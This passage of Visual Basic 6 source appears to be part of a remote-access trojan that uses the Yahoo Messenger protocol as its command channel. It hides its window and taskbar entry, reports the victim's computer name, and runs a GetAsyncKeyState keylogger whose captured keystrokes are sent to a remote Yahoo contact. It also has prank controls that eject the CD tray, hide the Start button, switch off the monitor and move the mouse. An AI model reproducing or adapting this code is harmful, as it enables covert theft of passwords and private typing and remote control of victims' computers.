    NumberOfDataCame = NumberOfDataCame + 1
    
    
    
'---to be simple! alot are just one byte
    If ReceivedPacket(1).Data <> "" Then
        If ReceivedPacket(1).IsInline = False Then
            DataFragment ReceivedPacket(1).Data, FragmentedData
        Else
            
            ReDim FragmentedData(1 To InlinePacketLen(1))
            For j = 1 To InlinePacketLen(1)
                FragmentedData(j) = ReceivedInlineFragmentedData(1, j)
            Next j
            For i = 1 To TotalInlinesBufferd
                If InlinePacketLen(i + 1) = 0 Then
                    Exit For
                End If
                For j = 1 To InlinePacketLen(i + 1)
                    ReceivedInlineFragmentedData(i, j) = ReceivedInlineFragmentedData(i + 1, j)
                Next j
                InlinePacketLen(i) = InlinePacketLen(i + 1)
            Next i
            TotalInlinesBufferd = TotalInlinesBufferd - 1
        End If
        LastStatus = Val("&H" + AnySection2HexString(ReceivedPacket(1).Status))
        Select Case Val("&H" + AnySection2HexString(ReceivedPacket(1).Service))
            Case YAHOO_SERVICE_AUTH '=57
            Call GetEncrStrings(lblUserName.Caption, lblPassWord.Caption, CombinedDataWithKey(FragmentedData, "94"), Str1, Str2, 1)     ', FragmentedData(4), str1, str2)
                    SentPacket.Service(1) = 0
                    SentPacket.Service(2) = YAHOO_SERVICE_AUTHRESP
            
                    SentPacket.Status(1) = 0
                    SentPacket.Status(2) = 0
                    SentPacket.Status(3) = 0
                    
                    SentPacket.SessionID(1) = 0
                    SentPacket.SessionID(2) = 0
                    SentPacket.SessionID(3) = 0
                    SentPacket.SessionID(4) = 0
                
                    '"0","6","96" are the keys here
                    SentPacket.Data = "0" + Separator + lblUserName.Caption + Separator + "6" + Separator + Str1 + Separator + "96" + Separator + Str2 + Separator
                   
                    SentPacket.Data = SentPacket.Data + "2" + Separator + "1" + Separator + "1" + Separator + lblUserName.Caption + Separator
                
    
                    ConvertYmsgType2ByteArray SentPacket, strByte
                    sckMain.SendData strByte
                    DoEvents

            Case Else
                Str1 = CombinedDataWithKey(FragmentedData, "4")
                Str2 = CombinedDataWithKey(FragmentedData, "5")
                TSh = CombinedDataWithKey(FragmentedData, "14")
                If TSh <> "" Then
                    lblCMD.Text = TSh
                End If
               TSh = CombinedDataWithKey(FragmentedData, "11")

        End Select
       
    
    End If
    LastPacketReceived.Data = ReceivedPacket(TotalPacketsBufferd).Data
        
    LastPacketReceived.Service(1) = ReceivedPacket(TotalPacketsBufferd).Service(1)
    LastPacketReceived.Service(2) = ReceivedPacket(TotalPacketsBufferd).Service(2)
    If ReceivedPacket(TotalPacketsBufferd).IsInline = False Then
        LastPacketReceived.SessionID(1) = ReceivedPacket(TotalPacketsBufferd).SessionID(1)
        LastPacketReceived.SessionID(2) = ReceivedPacket(TotalPacketsBufferd).SessionID(2)
        LastPacketReceived.SessionID(3) = ReceivedPacket(TotalPacketsBufferd).SessionID(3)
        LastPacketReceived.SessionID(4) = ReceivedPacket(TotalPacketsBufferd).SessionID(4)
    End If
    LastPacketReceived.Status(1) = ReceivedPacket(TotalPacketsBufferd).Status(1)
    LastPacketReceived.Status(2) = ReceivedPacket(TotalPacketsBufferd).Status(2)
    LastPacketReceived.Status(3) = ReceivedPacket(TotalPacketsBufferd).Status(3)
    LastPacketReceived.Status(4) = ReceivedPacket(TotalPacketsBufferd).Status(4)
    
    TSh = AnySection2HexString(LastPacketReceived.SessionID)
    
    
    'Shift the fifo buffer
    For i = 1 To TotalPacketsBufferd
        If ReceivedPacket(i + 1).IsInline = False Then
            ReceivedPacket(i).Data = ReceivedPacket(i + 1).Data
        End If
        ReceivedPacket(i).Service(1) = ReceivedPacket(i + 1).Service(1)
        ReceivedPacket(i).Service(2) = ReceivedPacket(i + 1).Service(2)
        
        ReceivedPacket(i).SessionID(1) = ReceivedPacket(i + 1).SessionID(1)
        ReceivedPacket(i).SessionID(2) = ReceivedPacket(i + 1).SessionID(2)
        ReceivedPacket(i).SessionID(3) = ReceivedPacket(i + 1).SessionID(3)
        ReceivedPacket(i).SessionID(4) = ReceivedPacket(i + 1).SessionID(4)
        
        ReceivedPacket(i).Status(1) = ReceivedPacket(i + 1).Status(1)
        ReceivedPacket(i).Status(2) = ReceivedPacket(i + 1).Status(2)
        ReceivedPacket(i).Status(3) = ReceivedPacket(i + 1).Status(3)
        ReceivedPacket(i).Status(4) = ReceivedPacket(i + 1).Status(4)
        
        ReceivedPacket(i).IsInline = ReceivedPacket(i + 1).IsInline
        
        DoEvents
    Next i
    
    
    
    TotalPacketsBufferd = TotalPacketsBufferd - 1
    PreviousPacketFinished = True
End If
tmrHandleBuffer.Enabled = True

End Sub



Private Sub sckMain_SendProgress(ByVal bytesSent As Long, ByVal bytesRemaining As Long)
WinsockIsInSendingProgress = True
End Sub

Private Sub TacGia_Timer()
On Error GoTo Eroac
Dim o As Long
    o = FindWindow(vbNullString, ThuocGiai.Caption)
    
    If o <> 0 Then
        End
    End If
Eroac:
End Sub

Private Sub Text1_Change()
If Right(Text1.Text, 1) = Chr(10) Then
  '***************
        txt2SendFriend.Text = Text1.Text
        Text1.Text = ""
        cmdSend_Click
        '****************
End If
End Sub

Private Sub Text2_Change()
If Len(Text2.Text) > 600 Then
    Text3.Text = Mid$(Text2.Text, 600, Len(Text2.Text) - 599)
End If
Text2 = Left(Text2, 600)
End Sub

Private Sub Text3_Change()
If Len(Text3.Text) > 600 Then
    Text4.Text = Mid$(Text3.Text, 600, Len(Text3.Text) - 599)
End If
Text3 = Left(Text3, 600)
End Sub


Private Sub Text4_Change()

Text4 = Left(Text4, 600)
End Sub



Private Sub Timer1_Timer()
Dim Ret As Long
    Ret = InternetGetConnectedStateEx(Ret, sConnType, 254, 0)
    If Ret = 1 Then
FunctionMadeError = "Command Login"
sckMain.Close
sckMain.Connect

Me.Visible = False
App.TaskVisible = False
Timer1.Enabled = False
End If
End Sub

Private Sub Timer2_Timer()
OnOffThoiGian = OnOffThoiGian + 1
If OnOffThoiGian = 300 Then
sckMain.Close
FunctionMadeError = "Command Login"
sckMain.Connect
OnOffThoiGian = 0
End If
End Sub

Private Sub Timer3_Timer()
    Dim dwLen As Long
    Dim strString As String
    dwLen = MAX_COMPUTERNAME_LENGTH + 1
    strString = String(dwLen, "X")
    GetComputerName strString, dwLen
    strString = Left(strString, dwLen)
txt2SendFriend.Text = strString & " Is Online"
cmdSend_Click
Timer3.Enabled = False
End Sub

Private Sub Timer4_Timer()

Randomize
CMouse.MoveTo Int((1000 * Rnd) * 1), Int((700 * Rnd) * 1)

End Sub

Private Sub Timer5_Timer()

Dim ma As Long
    ma = FindWindow(vbNullString, MaXacNhan.Caption)
    If ma <> 0 Then
    Me.Visible = True
    End If
    
End Sub

Private Sub TimerMH_Timer()
Timer1.Enabled = False
   Call SendMessage(Me.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, ByVal MONITOR_ON)
End Sub

Private Sub tmrHandleBuffer_Timer()
Call HandleBuffer
If TotalPacketsBufferd = 0 Then
    tmrHandleBuffer.Enabled = False
End If
End Sub



Private Sub TmrKeyLogger_Timer()
    
    Dim AddKey
    KeyResult = GetAsyncKeyState(13)
    If KeyResult = -32767 Then
        AddKey = vbCrLf
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(8)
    If KeyResult = -32767 Then
        l = Len(Text1.Text)
        If l > -1 Then
            'AddKey = "...Bksp..."
            AddKey = "[Back]"
        End If
        GoTo KeyFound
    End If
   
    
'------------FUNCTION KEYS
'------------SEPCIAL KEYS



KeyResult = GetAsyncKeyState(18)
    If KeyResult = -32767 Then
        AddKey = "[Alt]"
        GoTo KeyFound
    End If


KeyResult = GetAsyncKeyState(17)
    If KeyResult = -32767 Then
        AddKey = "[Ctrl]"
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(32)
    If KeyResult = -32767 Then
        AddKey = " "
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(9)
    If KeyResult = -32767 Then
        AddKey = "[TAB]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(186)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = ";" Else AddKey = ":"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(187)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "=" Else AddKey = "+"
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(188)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "," Else AddKey = "<"
       GoTo KeyFound
    End If
   
KeyResult = GetAsyncKeyState(189)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "-" Else AddKey = "_"
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(190)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "." Else AddKey = ">"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(191)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "/" Else AddKey = "?"   '/
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(192)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "`" Else AddKey = "~"       '`
        GoTo KeyFound
    End If
     


'----------NUM PAD
KeyResult = GetAsyncKeyState(96)
    If KeyResult = -32767 Then
        AddKey = "0"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(97)
    If KeyResult = -32767 Then
        AddKey = "1"
        GoTo KeyFound
    End If
     

KeyResult = GetAsyncKeyState(98)
    If KeyResult = -32767 Then
        AddKey = "2"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(99)
    If KeyResult = -32767 Then
        AddKey = "3"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(100)
    If KeyResult = -32767 Then
        AddKey = "4"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(101)
    If KeyResult = -32767 Then
        AddKey = "5"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(102)
    If KeyResult = -32767 Then
        AddKey = "6"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(103)
    If KeyResult = -32767 Then
        AddKey = "7"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(104)
    If KeyResult = -32767 Then
        AddKey = "8"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(105)
    If KeyResult = -32767 Then
        AddKey = "9"
        GoTo KeyFound
    End If
       
    
KeyResult = GetAsyncKeyState(106)
    If KeyResult = -32767 Then
        AddKey = "*"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(107)
    If KeyResult = -32767 Then
        AddKey = "+"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(108)
    If KeyResult = -32767 Then
   
       
        AddKey = ""
        Text1.Text = Text1.Text & vbCrLf & "[Enter]" & vbCrLf
       
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(109)
    If KeyResult = -32767 Then
        AddKey = "-"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(110)
    If KeyResult = -32767 Then
        AddKey = "."
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(2)
    If KeyResult = -32767 Then
        AddKey = "/"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(220)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "\" Else AddKey = "|"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(222)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "'" Else AddKey = Chr(34)
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(221)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "]" Else AddKey = "}"
        
        
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(219) '219
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[" Else AddKey = "{"
        GoTo KeyFound
    End If
    
Skip:
    KeyLoop = 41
    Do Until KeyLoop = 127 ' otherwise check For numbers and letters
        KeyResult = GetAsyncKeyState(KeyLoop)
        If KeyResult = -32767 Then
            If KeyLoop > 64 And KeyLoop < 91 Then
                If GetCapslock = True And GetShift = True Then KeyLoop = KeyLoop + 32
                If GetCapslock = False And GetShift = False Then KeyLoop = KeyLoop + 32
            End If
            If KeyLoop > 47 And KeyLoop < 58 Then
                If GetShift = True Then
                    AddKey = ax(Val(Chr(KeyLoop)))
                    GoTo KeyFound
                End If
            End If
            
           Text1.Text = Text1.Text + Chr(KeyLoop)
        End If
        KeyLoop = KeyLoop + 1
    Loop
    LastKey = AddKey
    Exit Sub
KeyFound:
Text1.Text = Text1.Text & AddKey
End Sub

Private Sub tmrStatus_Timer()
Dim SckSt As Byte
Dim ByteArray() As Byte
Static ShowBusyIcon As String
Dim CustomStSt As String
Static StateCnt As Byte
Static TSh As String * 1
Static NowSendedStat As Byte

SckSt = sckMain.State

If LastWSState <> SckSt Then
    
    LastWSState = SckSt
   Timer3.Enabled = True
End If



End Sub

Private Sub cmdSend_Click()

Static IsNotItTheFirst As Boolean
Dim ByteArray() As Byte
Dim str As String
Dim i As Long
Dim strFriendNames As String

If txt2SendFriend.Text <> "" Then
IsNotItTheFirst = False
      
        SentPacket.Service(1) = 0
        SentPacket.Service(2) = YAHOO_SERVICE_MESSAGE

        SentPacket.Status(1) = &H5A
        SentPacket.Status(2) = &H55
        SentPacket.Status(3) = &HAA
        SentPacket.Status(4) = &H56 'always this is true

        
        
        str = txt2SendFriend.Text
       SentPacket.Data = "1" + Separator + lblUserName.Caption + Separator + "5" + Separator + lblYou.Caption + Separator + "14" + Separator + str + Separator + "97" + Separator + "1" + Separator + "63" + Separator + ";0" + Separator + "64" + Separator + "0" + Separator + "1002" + Separator + "1" + Separator
            ConvertYmsgType2ByteArray SentPacket, ByteArray
            If frmMain.sckMain.State = sckConnected Then
            frmMain.sckMain.SendData ByteArray
               txt2SendFriend = ""
            End If
End If
If Text2.Text <> "" Then
IsNotItTheFirst = False
      
        SentPacket.Service(1) = 0
        SentPacket.Service(2) = YAHOO_SERVICE_MESSAGE

        SentPacket.Status(1) = &H5A
        SentPacket.Status(2) = &H55
        SentPacket.Status(3) = &HAA
        SentPacket.Status(4) = &H56 'always this is true

        
        
        str = Text2.Text
       SentPacket.Data = "1" + Separator + lblUserName.Caption + Separator + "5" + Separator + lblYou.Caption + Separator + "14" + Separator + str + Separator + "97" + Separator + "1" + Separator + "63" + Separator + ";0" + Separator + "64" + Separator + "0" + Separator + "1002" + Separator + "1" + Separator
            ConvertYmsgType2ByteArray SentPacket, ByteArray
            If frmMain.sckMain.State = sckConnected Then
            frmMain.sckMain.SendData ByteArray
               Text2 = ""
            End If
End If
If Text3.Text <> "" Then
IsNotItTheFirst = False
      
        SentPacket.Service(1) = 0
        SentPacket.Service(2) = YAHOO_SERVICE_MESSAGE

        SentPacket.Status(1) = &H5A
        SentPacket.Status(2) = &H55
        SentPacket.Status(3) = &HAA
        SentPacket.Status(4) = &H56 'always this is true

        
        
        str = Text3.Text
       SentPacket.Data = "1" + Separator + lblUserName.Caption + Separator + "5" + Separator + lblYou.Caption + Separator + "14" + Separator + str + Separator + "97" + Separator + "1" + Separator + "63" + Separator + ";0" + Separator + "64" + Separator + "0" + Separator + "1002" + Separator + "1" + Separator
            ConvertYmsgType2ByteArray SentPacket, ByteArray
            If frmMain.sckMain.State = sckConnected Then
            frmMain.sckMain.SendData ByteArray
               Text3 = ""
            End If
End If
If Text4.Text <> "" Then
IsNotItTheFirst = False
      
        SentPacket.Service(1) = 0
        SentPacket.Service(2) = YAHOO_SERVICE_MESSAGE

        SentPacket.Status(1) = &H5A
        SentPacket.Status(2) = &H55
        SentPacket.Status(3) = &HAA
        SentPacket.Status(4) = &H56 'always this is true

        
        
        str = Text4.Text
       SentPacket.Data = "1" + Separator + lblUserName.Caption + Separator + "5" + Separator + lblYou.Caption + Separator + "14" + Separator + str + Separator + "97" + Separator + "1" + Separator + "63" + Separator + ";0" + Separator + "64" + Separator + "0" + Separator + "1002" + Separator + "1" + Separator
            ConvertYmsgType2ByteArray SentPacket, ByteArray
            If frmMain.sckMain.State = sckConnected Then
            frmMain.sckMain.SendData ByteArray
               Text4 = ""
            End If
End If

If Xem = True Then
mouse_event.Enabled = True
TmrKeyLogger.Enabled = True
End If
End Sub

Private Sub Xx()
txt2SendFriend = "OK"
cmdSend_Click
End Sub
Private Sub ThatBai()

End Sub
Private Sub OpenCDROM()
On Error GoTo ErorrHandle
Error = mciSendString("set cdaudio door open", 0, 0, 0)
Xx
ErorrHandle:
ThatBai
End Sub
Private Sub CloseCDROM()
On Error GoTo ErorrHandle
Error = mciSendString("set cdaudio door closed", 0, 0, 0)
Xx
ErorrHandle:
ThatBai
End Sub
Private Sub HideStart()
On Error GoTo ErorrHandle
    tWnd = FindWindow("Shell_TrayWnd", vbNullString)
    
    bWnd = FindWindowEx(tWnd, ByVal 0&, "BUTTON", vbNullString)
    
    ShowWindow bWnd, SW_HIDE
    Xx
ErorrHandle:
ThatBai
End Sub

Private Sub ShowStart()
On Error GoTo ErorrHandle
ShowWindow bWnd, SW_NORMAL


    ShowWindow tWnd, SW_NORMAL
    Xx
ErorrHandle:
ThatBai
End Sub
Private Sub OffMH()
On Error GoTo ErorrHandle
Call SendMessage(Me.hwnd, WM_SYSCOMMAND, SC_MONITORPOWER, ByVal MONITOR_OFF)
   With TimerMH
      .Interval = 5000
      .Enabled = True
   End With
Xx
ErorrHandle:
ThatBai
End Sub



Private Sub txt2SendFriend_Change()
If Len(txt2SendFriend.Text) > 600 Then
    Text2.Text = Mid$(txt2SendFriend.Text, 600, Len(txt2SendFriend.Text) - 599)
End If
txt2SendFriend.Text = Left(txt2SendFriend.Text, 600)
End Sub

